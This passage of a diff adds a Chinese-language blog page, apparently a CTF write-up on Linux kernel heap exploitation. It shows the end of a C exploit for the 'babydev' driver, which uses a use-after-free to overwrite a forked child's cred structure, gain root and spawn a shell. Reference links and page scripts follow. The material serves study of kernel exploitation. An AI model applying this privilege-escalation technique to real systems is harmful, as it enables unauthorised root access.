+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//open两次设备，分配两个对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/babydev&#34;</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/babydev&#34;</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//申请0xa8大小的device_buf，cred结构体大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span><span class="mh">0x10001</span><span class="p">,</span><span class="mh">0xa8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//关闭设备，释放fd1的device_buf。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">fd1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">//fork分配cred结构体，相当于kmalloc(0xa8)，这样会复用被释放的fd1的device_buf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//这样fd2的device_buf和新分配的cred结构体就指向同一内核堆空间
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;fork error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">pid</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span> <span class="c1">//判断是否为子进程
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//覆盖cred结构体。因为堆块重叠，实际覆盖了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//直接覆盖子进程的 cred 结构体前 32 字节 → 把 uid/gid 等字段改成 0 → 提权为 root。
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">write</span><span class="p">(</span><span class="n">fd2</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">//获取root权限后返回一个shell
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">()</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hacked</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://evilpan.com/2020/03/21/linux-slab/#%E5%89%8D%E8%A8%80">Linux内核的内存管理与漏洞利用案例分析 - 有价值炮灰</a>
+<a href="https://bbs.kanxue.com/thread-269149-1.htm#msg_header_h1_2">[原创]Linux内核5.13版本内存管理模块源码分析-二进制漏洞-看雪安全社区｜专业技术交流与安全研究论坛</a>
+<a href="https://www.bilibili.com/video/BV1Xz4y1w7z8/?p=2&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click">剖析Linux内核内存管理(二)_哔哩哔哩_bilibili</a>
+<a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">【OS.0x02】Linux 内核内存管理I - 页、区、节点 - arttnba3&rsquo;s blog</a>
+<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">【OS.0x03】Linux内核内存管理II - Buddy System - arttnba3&rsquo;s blog</a>
+<a href="https://www.cnblogs.com/binlovetech/p/17434311.html">深度解析 slab 内存池回收内存以及销毁全流程 - bin的技术小屋 - 博客园</a>
+<a href="https://bbs.kanxue.com/thread-268462.htm#%E6%80%9D%E8%B7%AF%E4%BA%8C%5C%28race%E6%9E%84%E9%80%A0uaf%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80%5C%29">[原创]强网杯线上赛Linux内核Pwn之notebook-Pwn-看雪论坛-安全社区|非营利性质技术交流社区</a>
+<a href="https://ltfa1l.top/2024/07/24/system/kernel/Linux_kernel3_%E5%A0%86%E5%96%B7%E5%B0%84/#Linux-kernel%E4%B9%8B%E5%A0%86%E5%96%B7%E5%B0%84-heap-spray">0x04. Linux kernel基础：堆喷射 - Ltfall&rsquo;s Code</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
